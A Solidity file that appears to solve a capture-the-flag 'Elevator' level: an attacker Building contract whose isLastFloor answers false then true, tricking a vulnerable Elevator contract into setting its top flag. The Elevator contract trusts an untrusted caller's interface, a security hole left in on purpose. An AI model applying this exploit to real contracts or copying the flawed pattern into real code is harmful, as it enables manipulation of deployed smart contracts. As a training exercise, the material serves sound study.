// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Building {
    
    bool once = false;
    
    function attack(address _address, uint _floor) external {
        Elevator e = Elevator(_address);
        e.goTo(_floor);
    }
    
    function setOnce(bool _bool) external {
        once = _bool;
    }
    
    function isLastFloor(uint _floor) external returns (bool) {
        if (!once) {
            once = true;
            return false;
        } else {
            return true;
        }
    }
}


contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (! building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}